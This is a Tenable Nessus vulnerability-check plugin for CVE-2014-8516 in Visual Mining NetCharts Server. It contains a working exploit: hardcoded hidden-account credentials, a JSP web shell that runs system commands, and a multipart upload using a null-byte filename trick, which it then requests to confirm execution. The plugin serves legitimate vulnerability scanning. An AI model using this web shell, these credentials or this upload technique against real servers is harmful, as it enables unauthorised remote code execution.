#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(80083);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2017/02/10 22:03:56 $");

  script_cve_id("CVE-2014-8516");
  script_bugtraq_id(70895);
  script_osvdb_id(114127);

  script_name(english:"Visual Mining NetCharts Server Arbitrary File Upload");
  script_summary(english:"Attempts to upload a file to execute arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a JSP script that allows arbitrary file
uploads.");
  script_set_attribute(attribute:"description", value:
"The Visual Mining NetCharts Server web interface installed on the
remote web server is affected by a file upload vulnerability due to a
built-in hidden account. An unauthenticated, remote attacker can
exploit this issue to upload files with arbitrary code and then
execute them on the remote host.");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-372/");
  script_set_attribute(attribute:"solution", value:"Restrict access to the vulnerable server.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Visual Mining NetCharts Server 7.0 File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Visual Mining NetCharts Server Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/11/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/12/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:visual_mining:netcharts_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2017 Tenable Network Security, Inc.");

  script_dependencies("visual_mining_netcharts_server_web_detect.nbin", "os_fingerprint.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_keys("installed_sw/Visual Mining NetCharts Server");
  script_require_ports("Services/www", 8001);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

app = "Visual Mining NetCharts Server";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:8001);

install = get_single_install(app_name:app, port:port);
install_dir = install["path"];

creds = make_array("Admin", "Admin", "Scheduler", "!@#$scheduler$#@!");

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";
line_limit = 2;

vuln = FALSE;

foreach cmd (cmds)
{
  if (cmd == 'id')
    dir_cmd = 'pwd';
  else
    dir_cmd = 'cmd /c dir .';

  jsp_content = '<%@ page import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec("'+cmd+'");
Process p2 = Runtime.getRuntime().exec("'+dir_cmd+'");
String output= "";
String temp = null;
InputStreamReader reader = new InputStreamReader(p.getInputStream());
BufferedReader stdin = new BufferedReader(reader);

while ((temp = stdin.readLine()) != null)
{
  output += temp;
  if (temp.length() > 0) {output += "\\n";}
}

output += "\\n";
temp = null;
reader = new InputStreamReader(p2.getInputStream());
stdin = new BufferedReader(reader);

while ((temp = stdin.readLine()) != null)
{
  output += temp;
  if (temp.length() > 0) {output += "\\n";}
}
%><%= output %>';

  foreach user (keys(creds))
  {
    pass = creds[user];

    clear_cookiejar();

    jsp_file_name = "nessus_" + rand() + ".jsp";
    bound = "_bound_nessus_" + rand();

    post_data =
      '--' + bound + '\r\n' +
      'Content-Disposition: form-data; name="FILE1"; filename="' + jsp_file_name + '\x00nessusArchive0301140000.zip"\r\n' +
      'Content-Type: application/octet-stream\r\n' +
      '\r\n' +
      jsp_content + '\r\n' +
      '--' + bound + '--';

    path = install_dir + "Admin/archive/upload.jsp?mode=getZip";

    # Attempt upload
    res2 = http_send_recv3(
      method    : "GET",
      item      : path,
      data      : post_data,
      username  : user,
      password  : pass,
      add_headers:
        make_array("Content-Type",
                   "multipart/form-data; boundary=" + bound),
      port         : port,
      exit_on_fail : TRUE
    );
    exp_request = http_last_sent_request();

    # if our creds don't work for the upload, skip attempting to verify
    if ("401" >< res2[0])
      continue;

    # Try accessing the file we created
    upload_loc = install_dir + "Admin/archive/ArchiveCache/";
    verify_path = upload_loc + jsp_file_name;
    res2 = http_send_recv3(
      method       : "GET",
      item         : verify_path,
      port         : port,
      username     : user,
      password     : pass,
      exit_on_fail : TRUE
    );
    output = res2[2];

    if (output =~ cmd_pats[cmd])
    {
      vuln = TRUE;

      get_up_path = "";
      # Extract path for reporting
      if (cmd == 'id')
      {
        line_limit = 2;
        get_path = strstr(output, "/");
        get_up_path = chomp(get_path) + "/webapps/Admin/archive/ArchiveCache/";
      }
      else
      {
        line_limit = 10;
        get_path = strstr(output, "Volume in drive");
        get_dir = egrep(pattern:" Directory of (.+)", string:get_path);
        if(get_dir != "")
           get_up_path = chomp((get_dir - " Directory of ")) + '\\webapps\\Admin\\archive\\ArchiveCache\\';
      }
      break;
    }
  }
  if (vuln) break;
}

full_url = build_url(port:port, qs:path);
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, full_url);

verify_url = build_url(port:port, qs:verify_path);

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  cmd         : cmd,
  line_limit  : line_limit,
  request     : make_list(full_url, verify_url),
  output      : chomp(output),
  rep_extra   : '\n' + 'Note: This file has not been removed by Nessus and will need to be' +
                '\n' + 'manually deleted (' + get_up_path + jsp_file_name + ').'
);

